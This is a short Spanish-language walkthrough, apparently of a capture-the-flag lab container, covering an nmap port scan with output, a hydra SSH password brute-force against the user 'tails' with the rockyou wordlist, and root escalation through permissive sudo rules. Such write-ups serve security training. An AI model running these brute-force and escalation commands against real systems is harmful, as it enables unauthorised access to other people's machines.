## Captura de servicios y puertos.
```bash
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn -sC 172.17.0.2 -oG allPorts
```
```plaintext
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn -sC 172.17.0.2 -oG allPorts

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 34:0d:04:25:20:b6:e5:fc:c9:0d:cb:c9:6c:ef:bb:a0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNt2acaF9CKWqvibDqz36bJdqRXhBhBqCOAtvExAJy9Q2FullFAzNST6vJm0xFrlmpgS6fZb5+l3aTYFC18zyNU=
|   256 05:56:e3:50:e8:f4:35:96:fe:6b:94:c9:da:e9:47:1f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH2vWYkHZteiOgnLadFoN6gkctYlQYhtwGFeA7lm1OKE
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

## Práctica

Observamos el puerto 80 está corriendo una pagina web, viendo que hay una palabra **tails**. Sabemos que por el puerto 22 se permiten conexiones por ssh, es conveniente intentar hacer fuerza bruta por ssh con la palabra encontrada.
```bash
hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 
```

Ya hemos ganado acceso como usuario, ahora debemos escalar privilegios, sudo -l

Descubrimos que para ser usuario sonic debemos de ejecutar cualquier binario, con lo que nos bastará con poner el siguiente comando sudo -u sonic /bin/bash

Finalmente al hacer nuevamente sudo -l obtenemos todo tipo de acceso y para escalar privilegios ingresamos **sudo su**. 


